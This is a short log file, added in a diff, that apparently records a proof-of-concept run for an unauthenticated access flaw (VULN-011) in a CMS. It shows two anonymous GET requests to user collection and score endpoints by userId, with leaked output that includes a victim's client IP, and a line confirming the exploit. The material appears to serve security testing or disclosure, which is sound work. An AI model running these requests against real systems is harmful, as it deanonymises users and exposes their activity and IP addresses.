@@ -1,0 +1,8 @@
+[INFO] VULN-011: unauth deanonymization of user scores/collections by userId
+[SETUP] admin login + create victim fan_icfmxhvt
+[SETUP] victim id=9; recording a collection + a score on content 1
+[STEP] anonymous GET /api/directive/cms/userCollectionList?userId=9
+[STEP] anonymous GET /api/directive/cms/userScoreList?userId=9
+[INFO] collections: {"page":{"firstPage":true,"firstResult":0,"lastPage":true,"list":[{"id":{"userId":"9","contentId":"1"},"createDate":1789874656000}],"nextPag
+[INFO] scores:      {"page":{"firstPage":true,"firstResult":0,"lastPage":true,"list":[{"id":{"userId":"9","itemType":"content","itemId":"1"},"score":5,"ip":"172.19.0.1","createDate
+[OK] exploit confirmed — anonymous caller read victim userId=9 activity (collection + score, incl. client IP)
